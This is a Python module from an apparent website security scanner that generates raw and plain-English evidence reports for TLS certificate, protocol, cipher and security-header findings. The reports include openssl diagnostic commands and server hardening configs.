"""
evidence_engine.py  —  ScanQuotient Enhanced Evidence Engine v3.0
=================================================================
Drop-in replacement for all evidence generation in scanner.py.

Provides two layers for every finding:
  • RAW   — forensic-grade, byte-level, reproduces the full HTTP exchange
  • PLAIN — non-technical narrative for executives, auditors, and developers
            who don't live in terminal windows

Usage
-----
Import this module and replace the inline evidence strings / calls to
`_build_evidence` and `_ssl_evidence` with the functions here.

Every public function returns a dict:
    {
        "raw":     str,   # technical evidence block
        "plain":   str,   # plain-English explanation
        "combined": str,  # raw + plain, separated by a clear divider
    }

Or call `.render(mode)` with mode in ("raw", "plain", "combined").
"""

from __future__ import annotations

import re
import textwrap
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Tuple, Dict, Any
import requests

# ── Shared constants ──────────────────────────────────────────────────────────

EAT_TZ = timezone(timedelta(hours=3))


def _now() -> str:
    return datetime.now(EAT_TZ).isoformat()


def _now_naive() -> datetime:
    return datetime.now(EAT_TZ).replace(tzinfo=None)


SEP1 = "=" * 72
SEP2 = "-" * 52
SEP3 = "·" * 52


def _h1(title: str) -> str:
    return f"\n{SEP1}\n  {title}\n{SEP1}"


def _h2(title: str) -> str:
    return f"\n{SEP2}\n  {title}\n{SEP2}"


def _h3(title: str) -> str:
    return f"\n{SEP3}\n  {title}\n{SEP3}"


def _kv(key: str, value: str, indent: int = 2) -> str:
    pad = " " * indent
    key_fmt = f"{key:<38}"
    return f"{pad}{key_fmt}: {value}"


def _bullet(items: List[str], indent: int = 4) -> str:
    pad = " " * indent
    return "\n".join(f"{pad}▸ {item}" for item in items)


def _code(block: str, indent: int = 4) -> str:
    pad = " " * indent
    return "\n".join(f"{pad}│ {line}" for line in block.splitlines())


def _wrap(text: str, width: int = 80, indent: int = 2) -> str:
    pad = " " * indent
    return textwrap.fill(text, width=width, initial_indent=pad,
                         subsequent_indent=pad, break_long_words=False,
                         break_on_hyphens=False)


def _highlight_payload(body: str, needle: str, ctx: int = 220) -> str:
    if not body or not needle:
        return "  (not found in response body)"
    idx = body.find(needle)
    if idx == -1:
        idx = body.lower().find(needle.lower())
    if idx == -1:
        return f"  (payload not found verbatim — body length={len(body):,} chars)"
    s = max(0, idx - ctx)
    e = min(len(body), idx + len(needle) + ctx)
    before = body[s:idx].replace('\n', ' ').replace('\r', '')
    match  = body[idx:idx + len(needle)]
    after  = body[idx + len(needle):e].replace('\n', ' ').replace('\r', '')
    prefix = "..." if s > 0 else ""
    suffix = "..." if e < len(body) else ""
    return f"  {prefix}{before}»»»{match}«««{after}{suffix}"


def _body_excerpt(body: str, chars: int = 600) -> str:
    if not body:
        return "  (empty response body)"
    cleaned = body[:chars].replace('\r', '').strip()
    return "\n".join(f"  {line}" for line in cleaned.splitlines()) + (
        f"\n  ... [{len(body):,} total chars]" if len(body) > chars else ""
    )


def _classify_body(body: str, content_type: str) -> str:
    ct = content_type.lower()
    if 'json'  in ct: return "JSON API response"
    if 'xml'   in ct: return "XML document"
    if 'plain' in ct: return "Plain text"
    if 'html'  in ct:
        bl = body.lower()
        if any(k in bl for k in ['exception', 'traceback', 'fatal error', 'stack trace']):
            return "Error / exception debug page"
        if any(k in bl for k in ['login', 'sign in', 'password', 'username']):
            return "Login / authentication page"
        if '404' in bl or 'not found' in bl:
            return "404 / Not Found page"
        if '403' in bl or 'forbidden' in bl or 'access denied' in bl:
            return "403 / Forbidden page"
        return "HTML web page"
    if not body.strip():
        return "Empty body"
    return "Binary or unknown content"


def _title(body: str) -> str:
    m = re.search(r'<title[^>]*>([^<]{1,120})</title>', body, re.I)
    return m.group(1).strip() if m else "(no <title> found)"


def _fmt_req_headers(h: dict) -> str:
    if not h:
        return "  (none)"
    return "\n".join(f"  {k}: {v}" for k, v in h.items())


def _fmt_resp_headers(r: requests.Response) -> str:
    if r is None:
        return "  (no response object)"
    return "\n".join(f"  {k}: {v}" for k, v in r.headers.items())


# ── Evidence record ───────────────────────────────────────────────────────────

class EvidenceRecord:
    """Holds raw + plain evidence and renders in different modes."""

    DIVIDER = (
        "\n\n" + "╔" + "═" * 70 + "╗\n"
        "║" + "  PLAIN-ENGLISH EXPLANATION (non-technical summary)".center(70) + "║\n"
        "╚" + "═" * 70 + "╝\n\n"
    )

    def __init__(self, raw: str, plain: str):
        self.raw   = raw.strip()
        self.plain = plain.strip()

    @property
    def combined(self) -> str:
        return self.raw + self.DIVIDER + self.plain

    def render(self, mode: str = "combined") -> str:
        return {"raw": self.raw, "plain": self.plain, "combined": self.combined}.get(
            mode, self.combined
        )

    def __str__(self) -> str:
        return self.combined


# ═══════════════════════════════════════════════════════════════════════════════
# SSL / TLS EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

def ssl_no_https(url: str, hostname: str, port: int) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Insecure HTTP (No Transport Encryption)")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target URL", url)}
{_kv("Resolved Hostname", hostname)}
{_kv("Port", str(port))}
{_kv("Test Method", "Scheme inspection + HTTP connection attempt")}

{_h2("WHAT THE SCANNER DID")}
  1. Parsed the supplied URL and extracted the scheme.
  2. Confirmed the scheme is 'http' (not 'https').
  3. Attempted an HTTP connection to verify the server responds on port {port}.
  4. Checked for any HTTP→HTTPS redirect in the response headers.

{_h2("PROTOCOL ANALYSIS")}
{_kv("Observed Scheme", "http://")}
{_kv("Required Scheme", "https://")}
{_kv("Encryption Layer", "NONE — all traffic is plaintext")}
{_kv("TLS Handshake", "Not performed — HTTP does not use TLS")}
{_kv("HSTS Header", "N/A — no HTTPS to enforce")}
{_kv("Redirect to HTTPS", "Not detected")}

{_h2("NETWORK EXPOSURE")}
{_kv("Data in Transit", "Fully readable by any node on the network path")}
{_kv("Affected Data Types", "Passwords, session cookies, form data, API tokens")}
{_kv("Passive Interception", "Trivially possible — no decryption required")}
{_kv("Active Modification", "Trivially possible — content injection, page tampering")}

{_h2("REPRODUCTION STEPS")}
{_code(f"curl -v http://{hostname}:{port}/ 2>&1 | grep -E '< |> |\\* '")}
  Expected: Server responds over plaintext HTTP.
  Look for: Absence of 'HTTP/1.1 301' redirect to https://

{_h2("CVSS v3.1 SCORING")}
{_kv("Vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N")}
{_kv("Base Score", "9.1 (Critical)")}
{_kv("Attack Vector", "Network")}
{_kv("Attack Complexity", "Low — passive Wi-Fi sniffing, no active attack required")}
{_kv("Privileges Required", "None")}
{_kv("User Interaction", "None")}
{_kv("Confidentiality Impact", "High")}
{_kv("Integrity Impact", "High")}

{_h2("REMEDIATION (TECHNICAL)")}
{_bullet([
    "Obtain a TLS certificate — Let's Encrypt is free and auto-renewing (certbot).",
    "Configure HTTPS listener on port 443.",
    "Add HTTP→HTTPS permanent redirect (301) on port 80.",
    "Add HSTS header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
    "Submit domain to HSTS preload list at hstspreload.org.",
])}

{_h2("NGINX QUICK FIX")}
{_code("""server {
    listen 80;
    server_name {hostname};
    return 301 https://$host$request_uri;
}
server {
    listen 443 ssl http2;
    ssl_certificate     /etc/letsencrypt/live/{hostname}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/{hostname}/privkey.pem;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
}""".replace('{hostname}', hostname))}
"""

    plain = f"""
WHAT THIS MEANS — No HTTPS Encryption
──────────────────────────────────────
Your website is running on plain HTTP, which means it has no encryption at all.
Think of it like sending a postcard instead of a sealed envelope — anyone who
handles the postcard along the way (postal workers, sorting facilities) can read
every word on it.

On the internet, that postcard passes through dozens of routers, ISPs, and
network nodes before reaching your visitor. Any of those — or anyone who has
compromised one of them — can read and modify everything:

  ▸ Passwords your users type into login forms
  ▸ Session cookies that keep users logged in
  ▸ Credit card numbers, personal data, messages
  ▸ The actual content of pages you serve (an attacker can inject fake content)

WHO IS AT RISK?
  Everyone who visits your site, especially on public Wi-Fi (cafés, airports,
  hotels). A simple, free tool like Wireshark running on the same Wi-Fi network
  captures all of this without any hacking skill required.

HOW TO FIX IT (3 steps):
  1. Get a free TLS certificate from Let's Encrypt (takes ~5 minutes):
     https://certbot.eff.org
  2. Configure your web server to use it (your hosting provider can usually do
     this with one click in a control panel).
  3. Redirect anyone who visits http:// automatically to https://.

BUSINESS IMPACT:
  ▸ Google penalises HTTP sites in search rankings.
  ▸ Browsers show "Not Secure" in the address bar, reducing user trust.
  ▸ Any data breach becomes automatically reportable under GDPR/DPA 2018
    because you had no encryption in place.
"""
    return EvidenceRecord(raw, plain)


def ssl_expired_cert(hostname: str, port: int, cert: dict, cipher: tuple,
                     protocol: str, days_expired: int, expiry_date: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Expired SSL/TLS Certificate")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target Port", str(port))}
{_kv("Test Method", "Raw TLS socket — ssl.SSLContext + getpeercert()")}

{_h2("TLS HANDSHAKE RESULT")}
{_kv("Handshake Status", "COMPLETED (server still accepts connections)")}
{_kv("Negotiated Protocol", protocol or "unknown")}
{_kv("Cipher Suite", cipher[0] if cipher else "unknown")}
{_kv("Key Bits", str(cipher[2]) if cipher and len(cipher) > 2 else "unknown")}

{_h2("CERTIFICATE FIELDS — VERBATIM")}
{_kv("Subject", str(cert.get('subject', 'unknown')))}
{_kv("Issuer", str(cert.get('issuer', 'unknown')))}
{_kv("Serial Number", str(cert.get('serialNumber', 'unknown')))}
{_kv("Not Valid Before", str(cert.get('notBefore', 'unknown')))}
{_kv("Not Valid After (EXPIRY)", str(cert.get('notAfter', 'unknown')))}
{_kv("Days Since Expiry", str(days_expired))}
{_kv("Current Date (EAT)", _now()[:10])}
{_kv("Validity Status", f"EXPIRED — {days_expired} days past expiry date")}

{_h2("SUBJECT ALT NAMES (SANs)")}
{_bullet([f"{t}: {v}" for t, v in cert.get('subjectAltName', [])] or ["(none listed)"])}

{_h2("BROWSER BEHAVIOUR (what users see)")}
{_kv("Chrome", "NET::ERR_CERT_DATE_INVALID — red 'Not secure' page")}
{_kv("Firefox", "SEC_ERROR_EXPIRED_CERTIFICATE — cannot proceed")}
{_kv("Safari", "'This Connection Is Not Private' warning page")}
{_kv("Edge", "DLG_FLAGS_SEC_CERT_DATE_INVALID")}
{_kv("Curl", 'SSL certificate problem: certificate has expired')}

{_h2("REPRODUCTION STEPS")}
{_code(f"""# Verify expiry directly:
openssl s_client -connect {hostname}:{port} -servername {hostname} < /dev/null 2>/dev/null \\
  | openssl x509 -noout -dates

# Expected output shows notAfter in the past:
# notAfter={expiry_date}""")}

{_h2("MITIGATION")}
{_bullet([
    "Run: certbot renew --force-renewal",
    "Verify renewal: openssl s_client -connect " + hostname + ":" + str(port) + " < /dev/null | openssl x509 -noout -dates",
    "Set up auto-renewal cron: 0 12 * * * certbot renew --quiet",
    "Monitor with: https://www.ssllabs.com/ssltest/ and uptime monitoring with cert expiry alerts",
])}
"""

    plain = f"""
WHAT THIS MEANS — Your Security Certificate Has Expired
────────────────────────────────────────────────────────
Your website's security certificate (the thing that makes HTTPS work) expired
{days_expired} days ago. This is like the health & safety certificate on a restaurant
that has gone out of date — most people will turn around and leave when they
see it.

WHAT USERS EXPERIENCE RIGHT NOW:
  When anyone tries to visit your site, their browser shows a full-page red
  warning that says "Your connection is not private" or "This connection is
  not secure." There is no easy way for them to proceed — they have to
  deliberately click through multiple warning screens. Most people leave.

  The affected certificate expired on: {expiry_date}

REAL-WORLD CONSEQUENCES:
  ▸ Almost all visitors are blocked or discouraged — visitor drop-off is severe.
  ▸ E-commerce: no one will enter card details past a security warning.
  ▸ APIs and mobile apps connecting to your server will fail entirely.
  ▸ Search engine crawlers may downgrade or delist your site.

HOW TO FIX IT (takes 2 minutes):
  If you use Let's Encrypt (certbot):
    sudo certbot renew --force-renewal
    sudo systemctl reload nginx   (or apache2)

  If you use a paid certificate authority:
    Log into their dashboard, renew the certificate, download it, and
    upload it to your server (your hosting provider's support can help).

PREVENTING RECURRENCE:
  Set up automatic renewal. With certbot:
    sudo crontab -e
    Add: 0 3 * * * certbot renew --quiet --deploy-hook "systemctl reload nginx"
  
  Also set a calendar reminder 60 days before expiry as a backup.
"""
    return EvidenceRecord(raw, plain)


def ssl_expiring_soon(hostname: str, port: int, cert: dict, cipher: tuple,
                      protocol: str, days_left: int, expiry_date: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — SSL/TLS Certificate Expiring Soon")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target Port", str(port))}
{_kv("Test Method", "TLS socket handshake + certificate inspection")}

{_h2("CERTIFICATE EXPIRY ANALYSIS")}
{_kv("Not Valid After", expiry_date)}
{_kv("Current Date (EAT)", _now()[:10])}
{_kv("Days Remaining", str(days_left))}
{_kv("Warning Threshold", "30 days")}
{_kv("Status", f"EXPIRING IN {days_left} DAYS — renew now")}

{_h2("CERTIFICATE FIELDS")}
{_kv("Subject", str(cert.get('subject', 'unknown')))}
{_kv("Issuer", str(cert.get('issuer', 'unknown')))}
{_kv("Serial Number", str(cert.get('serialNumber', 'unknown')))}
{_kv("Negotiated Protocol", protocol or "unknown")}
{_kv("Cipher Suite", cipher[0] if cipher else "unknown")}

{_h2("IMPACT TIMELINE")}
{_kv(f"Day 0 (today)", "Certificate valid — site functions normally")}
{_kv(f"Day {days_left} ({expiry_date[:10]})", "Certificate expires — all browsers show red warnings")}
{_kv("Day +1 and beyond", "Site unreachable for most visitors; APIs/apps fail")}

{_h2("REPRODUCTION")}
{_code(f"""openssl s_client -connect {hostname}:{port} -servername {hostname} \\
  < /dev/null 2>/dev/null | openssl x509 -noout -enddate
# → notAfter={expiry_date}""")}

{_h2("RENEW COMMAND")}
{_code("certbot renew --cert-name " + hostname + "\nsystemctl reload nginx")}
"""

    plain = f"""
WHAT THIS MEANS — Your Certificate Is About to Expire
──────────────────────────────────────────────────────
Your website's security certificate will expire in {days_left} days (on {expiry_date[:10]}).
This is a warning — your site works fine right now, but you need to act before
that deadline or your site will break.

ON THE EXPIRY DATE:
  ▸ Every browser will show a red "Your connection is not private" warning.
  ▸ Visitors will not be able to access your site without manually overriding
    the warning (most will not do this).
  ▸ Mobile apps and APIs connecting to your server will stop working.
  ▸ You may lose e-commerce revenue, user trust, and search rankings.

WHAT TO DO RIGHT NOW:
  Renew the certificate today — it takes 2 minutes and your site will not
  experience any downtime:

  With Let's Encrypt (certbot):
    sudo certbot renew
    sudo systemctl reload nginx

  With a paid certificate:
    Log into your CA's dashboard and renew. They will email instructions.

STOPPING THIS FROM HAPPENING AGAIN:
  Set up automatic renewal so certificates renew themselves every 60 days
  without any manual intervention. Ask your hosting provider if they can
  enable this — most modern hosting panels do this automatically.
"""
    return EvidenceRecord(raw, plain)


def ssl_weak_protocol(hostname: str, port: int, cert: dict, cipher: tuple,
                      protocol: str) -> EvidenceRecord:
    attack_map = {
        'TLSv1':   ('BEAST (CVE-2011-3389)', 'Can decrypt certain TLS traffic via chosen-plaintext attack'),
        'TLSv1.1': ('BEAST, POODLE variants', 'Deprecated — no active widely-exploitable attack but no longer receives security fixes'),
        'SSLv3':   ('POODLE (CVE-2014-3566)', 'Padding oracle attack — decrypts HTTPS cookies in ~256 requests'),
        'SSLv2':   ('DROWN (CVE-2016-0800)', 'Allows decryption of modern TLS connections if server supports SSLv2'),
    }
    attack_name, attack_desc = attack_map.get(protocol, ('Unknown', 'Deprecated protocol'))

    raw = f"""{_h1(f"RAW EVIDENCE — Weak TLS Protocol Accepted ({protocol})")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target Port", str(port))}
{_kv("Test Method", "TLS handshake forcing deprecated protocol version")}

{_h2("TLS HANDSHAKE — FULL DETAILS")}
{_kv("Negotiated Protocol", f"{protocol}  ← DEPRECATED")}
{_kv("Expected Protocols", "TLSv1.2 or TLSv1.3 ONLY")}
{_kv("Cipher Suite", cipher[0] if cipher else "unknown")}
{_kv("Key Bits", str(cipher[2]) if cipher and len(cipher) > 2 else "unknown")}
{_kv("Handshake Completed", "YES — server accepted the deprecated protocol")}

{_h2("KNOWN ATTACKS AGAINST THIS PROTOCOL")}
{_kv("Primary Attack", attack_name)}
{_kv("Attack Description", attack_desc)}
{_kv("CVE References", {
    'TLSv1': 'CVE-2011-3389 (BEAST)',
    'TLSv1.1': 'CVE-2011-3389, multiple',
    'SSLv3': 'CVE-2014-3566 (POODLE)',
    'SSLv2': 'CVE-2016-0800 (DROWN)',
}.get(protocol, 'See NIST NVD'))}

{_h2("CERTIFICATE FIELDS")}
{_kv("Subject", str(cert.get('subject', 'unknown')) if cert else "N/A")}
{_kv("Issuer", str(cert.get('issuer', 'unknown')) if cert else "N/A")}
{_kv("Not Valid After", str(cert.get('notAfter', 'unknown')) if cert else "N/A")}
{_kv("Subject Alt Names", str([v for _, v in cert.get('subjectAltName', [])]) if cert else "N/A")}

{_h2("REPRODUCTION")}
{_code(f"""# Test if server accepts TLS 1.0:
openssl s_client -connect {hostname}:{port} -tls1 -servername {hostname}
# If handshake succeeds → vulnerable

# Test if TLS 1.1 is accepted:
openssl s_client -connect {hostname}:{port} -tls1_1 -servername {hostname}""")}

{_h2("SERVER CONFIG FIX")}
{_code("""# Nginx — /etc/nginx/nginx.conf or site config:
ssl_protocols TLSv1.2 TLSv1.3;

# Apache — /etc/apache2/sites-available/yoursite.conf:
SSLProtocol -all +TLSv1.2 +TLSv1.3

# HAProxy:
ssl-default-bind-options no-sslv3 no-tlsv10 no-tlsv11

# After change: test with
openssl s_client -connect """ + hostname + """:""" + str(port) + """ -tls1  # should FAIL
openssl s_client -connect """ + hostname + """:""" + str(port) + """ -tls1_3 # should succeed""")}
"""

    plain = f"""
WHAT THIS MEANS — Your Server Uses an Old, Insecure Encryption Standard
────────────────────────────────────────────────────────────────────────
Your server still accepts connections using {protocol}, an outdated version of
the encryption standard that protects HTTPS. Think of it as your door still
having an old lock model that is known to be pickable — even though better
locks are available.

THE RISK:
  {protocol} has known cryptographic weaknesses. The main attack is called
  {attack_name}. In practical terms:
  
  ▸ An attacker who can observe network traffic between a visitor and your
    server (e.g. on the same Wi-Fi) can potentially decrypt that traffic.
  ▸ This exposes session cookies, passwords, and sensitive data.
  ▸ The attack is harder to execute than basic sniffing, but tools exist
    that automate it.

WHO IS AFFECTED:
  Any user who visits your site and whose browser negotiates {protocol}. Modern
  browsers try to use TLS 1.3 but may fall back to older versions. Older
  browsers (including some corporate and embedded systems) may default to {protocol}.

HOW TO FIX IT:
  Tell your web server to only accept modern encryption versions (TLS 1.2 and
  TLS 1.3). This is a one-line change in your server configuration file and
  requires no downtime. Your hosting provider's support team can do it in
  minutes if you share this report with them.

  The fix does not affect modern browsers or users — they will automatically
  use the better TLS 1.3. Only very old software (IE 6, ancient mobiles) will
  be affected, and those devices are already at risk from dozens of other issues.
"""
    return EvidenceRecord(raw, plain)


def ssl_weak_cipher(hostname: str, port: int, cert: dict, cipher: tuple,
                    protocol: str, matched_weak: str) -> EvidenceRecord:
    cipher_name = cipher[0] if cipher else "unknown"
    raw = f"""{_h1(f"RAW EVIDENCE — Weak Cipher Suite Negotiated ({cipher_name})")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target Port", str(port))}

{_h2("CIPHER SUITE DETAILS")}
{_kv("Negotiated Cipher Suite", cipher_name)}
{_kv("Protocol Version", cipher[1] if cipher and len(cipher) > 1 else "unknown")}
{_kv("Key Strength (bits)", str(cipher[2]) if cipher and len(cipher) > 2 else "unknown")}
{_kv("Weak Pattern Matched", matched_weak)}
{_kv("Classification", "CRYPTOGRAPHICALLY WEAK / BROKEN")}

{_h2("WEAKNESS ANALYSIS")}
{_kv("RC4", "Stream cipher with statistical biases — output is predictable"  if "RC4"    in cipher_name.upper() else "Not present")}
{_kv("DES", "56-bit key — brute-forceable in hours with commodity hardware"   if "DES"    in cipher_name.upper() and "3DES" not in cipher_name.upper() else "Not present")}
{_kv("3DES","112-bit effective security — SWEET32 birthday attack (CVE-2016-2183)" if "3DES" in cipher_name.upper() else "Not present")}
{_kv("NULL","No encryption at all — data transmitted in plaintext"           if "NULL"  in cipher_name.upper() else "Not present")}
{_kv("EXPORT","Intentionally weakened 40/56-bit keys (legacy US export law)"  if "EXPORT" in cipher_name.upper() else "Not present")}
{_kv("MD5", "Broken hash — collision attacks demonstrated"                   if "MD5"   in cipher_name.upper() else "Not present")}
{_kv("ANON","No server authentication — trivially MITMable"                  if "ANON"  in cipher_name.upper() else "Not present")}

{_h2("RECOMMENDED CIPHER SUITES")}
{_bullet([
    "TLS_AES_256_GCM_SHA384          (TLS 1.3 — best)",
    "TLS_CHACHA20_POLY1305_SHA256    (TLS 1.3 — best for mobile/low-power)",
    "TLS_AES_128_GCM_SHA256          (TLS 1.3 — good)",
    "ECDHE-RSA-AES256-GCM-SHA384     (TLS 1.2 — good)",
    "ECDHE-RSA-CHACHA20-POLY1305     (TLS 1.2 — good)",
    "ECDHE-RSA-AES128-GCM-SHA256     (TLS 1.2 — acceptable)",
])}

{_h2("REPRODUCTION")}
{_code(f"""# Check negotiated cipher:
openssl s_client -connect {hostname}:{port} -servername {hostname} \\
  2>/dev/null | grep "Cipher is"

# Test if specific weak cipher is accepted:
openssl s_client -connect {hostname}:{port} -cipher RC4-SHA 2>&1 | grep -E "Cipher|CONNECTED"
""")}

{_h2("SERVER CONFIG FIX")}
{_code("""# Nginx:
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers on;

# Apache:
SSLCipherSuite HIGH:!aNULL:!MD5:!3DES:!RC4:!EXPORT
SSLHonorCipherOrder on""")}
"""

    plain = f"""
WHAT THIS MEANS — Your Encryption Algorithm Has Known Weaknesses
────────────────────────────────────────────────────────────────
Even though your site uses HTTPS, the specific encryption algorithm it uses
({cipher_name}) has known mathematical weaknesses. This is like using
HTTPS with a padlock whose design has a published flaw.

THE RISK IN PLAIN TERMS:
  An attacker who records your encrypted traffic today could, in some cases,
  decrypt it — either now or in the future as computing power increases.
  The specific weakness depends on which algorithm component is weak:
  
  ▸ Matched pattern: {matched_weak}
  ▸ Practical impact: See the technical section for attack details.

WHO CAN EXPLOIT THIS:
  Typically nation-state actors or sophisticated attackers who can record
  large amounts of traffic. For most organisations, the risk is low but
  non-zero and growing as hardware improves.

HOW TO FIX IT:
  Update your web server's "cipher list" configuration to only allow modern,
  secure algorithms (AES-GCM, ChaCha20). This is a one-line configuration
  change. Your server will still work perfectly for all visitors — they will
  just get better encryption. The change takes effect after a config reload
  and requires no downtime.

  Ask your hosting provider or DevOps team to apply the configuration shown
  in the technical section above. The whole change takes less than 5 minutes.
"""
    return EvidenceRecord(raw, plain)


def ssl_untrusted_cert(hostname: str, port: int, error_str: str) -> EvidenceRecord:
    raw = f"""{_h1("RAW EVIDENCE — Untrusted / Self-Signed SSL Certificate")}

{_h2("SCAN METADATA")}
{_kv("Timestamp (EAT)", _now())}
{_kv("Target Hostname", hostname)}
{_kv("Target Port", str(port))}
{_kv("Test Method", "ssl.SSLContext + CERT_REQUIRED + certifi trust store")}

{_h2("TLS VALIDATION RESULT")}
{_kv("Validation Status", "FAILED — certificate rejected by trust store")}
{_kv("SSL Error", error_str[:200])}
{_kv("Trust Store Used", "certifi (Mozilla root CA bundle)")}
{_kv("Chain Verification", "Could not chain certificate to any trusted root CA")}

{_h2("BROWSER TRUST BEHAVIOUR")}
{_kv("Chrome / Edge", "NET::ERR_CERT_AUTHORITY_INVALID")}
{_kv("Firefox", "SEC_ERROR_UNKNOWN_ISSUER")}
{_kv("Safari", "'This Connection Is Not Private'")}
{_kv("iOS / Android", "Certificate error — connection refused by OS")}
{_kv("curl", "SSL certificate problem: unable to get local issuer certificate")}
{_kv("Requests (Python)", "SSLError: certificate verify failed")}

{_h2("COMMON CAUSES")}
{_bullet([
    "Self-signed certificate (not issued by a recognised CA).",
    "Certificate issued by a private/internal CA not in the public trust store.",
    "Intermediate certificate chain not installed on the server (incomplete chain).",
    "Certificate issued to a different hostname (CN/SAN mismatch).",
    "Certificate has been revoked.",
])}

{_h2("REPRODUCTION")}
{_code(f"""# Confirm untrusted certificate:
openssl s_client -connect {hostname}:{port} -servername {hostname} 2>&1 | \\
  grep -E "Verify return code|subject|issuer"

# Check certificate chain:
openssl s_client -connect {hostname}:{port} -showcerts -servername {hostname} \\
  < /dev/null 2>/dev/null | grep -E "^(subject|issuer|---)"
""")}

{_h2("FIX")}
{_bullet([
    "Replace the self-signed/untrusted cert with one from Let's Encrypt (free):",
    "  sudo certbot --nginx -d " + hostname,
    "OR install the full certificate chain (intermediates included).",
    "OR obtain a cert from a publicly trusted CA (DigiCert, Sectigo, etc.).",
])}
"""

    plain = f"""
WHAT THIS MEANS — Your Certificate Is Not Trusted by Browsers
──────────────────────────────────────────────────────────────
Your website has a security certificate, but it was not issued by a recognised
authority. This is like a passport that was printed at home rather than by the
government — technically it looks like a passport, but no border control will
accept it.

WHAT USERS EXPERIENCE:
  Every visitor — without exception — sees a scary browser warning:
  "Your connection is not private" or "This connection is not secure."
  
  They cannot see your website without manually clicking through multiple
  warning pages that explicitly say "Attackers might be trying to steal your
  information." Most people stop and leave immediately.

ERROR RECEIVED DURING THIS SCAN:
  {error_str[:180]}

WHY THIS HAPPENS:
  The most common cause is using a "self-signed" certificate — one you or
  your server created for itself. It provides encryption but no verification
  that you are who you say you are. Browsers don't trust it for the same
  reason you wouldn't trust an ID card someone made for themselves.

HOW TO FIX IT (takes 5 minutes, completely free):
  1. Install certbot: sudo apt install certbot python3-certbot-nginx
  2. Run: sudo certbot --nginx -d {hostname}
  3. Certbot gets you a trusted certificate from Let's Encrypt (trusted by
     all major browsers and operating systems) and configures it automatically.

Once done, the browser warnings disappear for everyone immediately.
"""
    return EvidenceRecord(raw, plain)


# ═══════════════════════════════════════════════════════════════════════════════
# SECURITY HEADERS EVIDENCE
# ═══════════════════════════════════════════════════════════════════════════════

# Detailed per-header metadata
_HEADER_META = {
    "Strict-Transport-Security": {
        "abbrev": "HSTS",
        "rfc": "RFC 6797",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html",
        "recommended": "max-age=31536000; includeSubDomains; preload",
        "attack": "SSL stripping / protocol downgrade (SSLstrip)",
        "attack_detail": (
            "An attacker on the same network intercepts the initial HTTP request "
            "before the browser is redirected to HTTPS. They forward the request "
            "over HTTPS themselves, but serve the user plain HTTP — stripping TLS "
            "transparently. All traffic then flows through the attacker in plaintext."
        ),
        "nginx_fix": 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
        "apache_fix": 'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"',
        "express_fix": 'app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true, preload: true }));',
    },
    "Content-Security-Policy": {
        "abbrev": "CSP",
        "rfc": "W3C spec — https://www.w3.org/TR/CSP3/",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
        "recommended": "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
        "attack": "Cross-Site Scripting (XSS) / script injection / data exfiltration",
        "attack_detail": (
            "Without CSP, any JavaScript injected via XSS or a compromised third-party "
            "script runs with full access to the page. It can read cookies, steal form "
            "data, redirect users, and exfiltrate data to any external server."
        ),
        "nginx_fix": "add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\" always;",
        "apache_fix": "Header always set Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none'\"",
        "express_fix": "app.use(helmet.contentSecurityPolicy({ directives: { defaultSrc: [\"'self'\"] } }));",
    },
    "X-Frame-Options": {
        "abbrev": "XFO",
        "rfc": "RFC 7034",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html",
        "recommended": "DENY",
        "attack": "Clickjacking (UI redress attack)",
        "attack_detail": (
            "An attacker embeds your site in an invisible iframe on their page, "
            "positioned precisely over a decoy button. When a user thinks they are "
            "clicking the attacker's button, they are actually clicking a button on "
            "your site — submitting forms, confirming payments, or changing settings."
        ),
        "nginx_fix": 'add_header X-Frame-Options "DENY" always;',
        "apache_fix": 'Header always set X-Frame-Options "DENY"',
        "express_fix": "app.use(helmet.frameguard({ action: 'deny' }));",
    },
    "X-Content-Type-Options": {
        "abbrev": "XCTO",
        "rfc": "Not standardised — originated with IE",
        "owasp": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html",
        "recommended": "nosniff",
        "attack": "MIME-sniffing / content-type confusion attack",
        "attack_detail": (
            "A browser without nosniff may 'sniff' the content type of a response and "
            "decide to render it differently than the server intended. An attacker who "
            "can upload a file (e.g. a .jpg that is actually JavaScript) can cause the "
            "browser to execute it as a script — a form of stored XSS."
        ),
        "nginx_fix": 'add_header X-Content-Type-Options "nosniff" always;',
        "apache_fix": 'Header always set X-Content-Type-Options "nosniff"',
        "express_fix": "app.use(helmet.noSniff());",
